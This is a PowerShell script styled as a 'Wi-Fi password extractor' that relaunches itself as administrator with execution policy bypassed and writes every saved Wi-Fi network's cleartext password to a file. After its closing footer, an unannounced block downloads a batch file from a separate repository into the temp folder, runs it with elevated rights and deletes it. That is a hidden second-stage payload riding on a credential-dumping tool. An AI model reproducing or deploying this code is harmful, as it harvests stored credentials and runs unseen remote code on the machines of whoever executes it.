
# ---------- ASCII banner ----------
$banner = @"
===========================================
   WIFI PASSWORD EXTRACTOR - SQD5 TOOL
===========================================
"@

Write-Host $banner -ForegroundColor Cyan

# ---------- small animated spinner ----------
function Show-Spinner {
    param(
        [int]$Seconds = 2,
        [string]$Message = "Loading..."
    )
    $frames = @('/','-','\','|')
    $end = (Get-Date).AddSeconds($Seconds)
    $i = 0
    while ((Get-Date) -lt $end) {
        $frame = $frames[$i % $frames.Count]
        Write-Host -NoNewline ("`r{0} {1}" -f $frame, $Message)
        Start-Sleep -Milliseconds 150
        $i++
    }
    Write-Host "`r$Message`r"  # clear spinner line (leave the message)
}
Show-Spinner -Seconds 2 -Message "Preparing script..."

# ---------- admin check and self-elevate ----------
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Write-Host "Not running as admin. Relaunching elevated..."
    Start-Process -FilePath powershell -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-File","`"$PSCommandPath`"" -Verb RunAs
    exit 1
}

# ---------- output file and logger ----------
$outFile = Join-Path $env:USERPROFILE "Downloads\wlan_passwords.txt"

function Write-Log {
    param([string]$Text)
    Write-Host $Text
    $timeStamped = ("[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Text)
    $timeStamped | Out-File -FilePath $outFile -Append -Encoding UTF8
}

Try {
    "=============================`nWi-Fi Password Extractor`n=============================`n" | Out-File -FilePath $outFile -Encoding UTF8 -Force
} Catch {
    Write-Host "Cannot write to $outFile. Check permissions."
    exit 1
}

# ---------- gather profiles ----------

Try {
    $profiles = netsh wlan show profiles 2>$null |
        Select-String "All User Profile" |
        ForEach-Object { $_.ToString().Split(':',2)[1].Trim() } | Sort-Object -Unique
} Catch {
    $profiles = @()
}

if (-not $profiles) {
    Write-Log "No WLAN profiles found."
    "`n=============================`nDone. No profiles found.`nVisit README: https://github.com/09sychic/sqd5/blob/main/README.md`n=============================" | Out-File -FilePath $outFile -Append -Encoding UTF8
    exit 0
}

# ---------- process profiles with Write-Progress ----------
$total = $profiles.Count
$i = 0
foreach ($p in $profiles) {
    $i++
    $percent = [int](($i / $total) * 100)
    Write-Progress -Activity "Extracting WLAN profiles" -Status "Processing..." -PercentComplete $percent

    Write-Log "Processing profile $i of $total $p"

    Try {
        $info = netsh wlan show profile name="$p" key=clear 2>$null
    } Catch {
        $info = $null
    }

    $ssidLine = "SSID: $p"
    $keyLine = $null
    if ($info) {
        $keyLine = ($info | Select-String "Key Content" | ForEach-Object {
            $_.ToString().Split(':',2)[1].Trim()
        }) -join ''
    }

    if (-not $keyLine) {
        $keyLine = "<No password saved or open network>"
    }

    "`n$ssidLine`nPassword: $keyLine`n------------------------" | Out-File -FilePath $outFile -Append -Encoding UTF8
    Write-Host ("Saved: {0}" -f $p)
}

# clear progress
Write-Progress -Activity "Extracting WLAN profiles" -Completed

# ---------- footer with === ASCII style and README link ----------
$footer = @"
`n============================= 
Done. Results saved to: $outFile
Visit README for more info:
https://github.com/09sychic/sqd5/blob/main/README.md
=============================
"@

$footer | Out-File -FilePath $outFile -Append -Encoding UTF8
Write-Host $footer

# Variables
$DownloadUrl = "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/refs/heads/main/run.bat"
$TempPath = [System.IO.Path]::GetTempPath()
$FileName = "run.bat"
$FullPath = Join-Path $TempPath $FileName

try {
    # Download file to Temp
    Write-Host "Downloading file to $FullPath..."
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $FullPath
    Write-Host "Download complete."

    # Execute the downloaded file
    Write-Host "Running downloaded file..."
    $process = Start-Process -FilePath $FullPath -Wait -PassThru
    Write-Host "Execution finished. Exit code: $($process.ExitCode)"

    # Optional wait after execution
    Start-Sleep -Seconds 3

} catch {
    Write-Host "Error: $($_.Exception.Message)"
} finally {
    # Cleanup
    if (Test-Path $FullPath) {
        Remove-Item $FullPath -Force
        Write-Host "Downloaded file removed."
    }
}

Write-Host "Script completed."
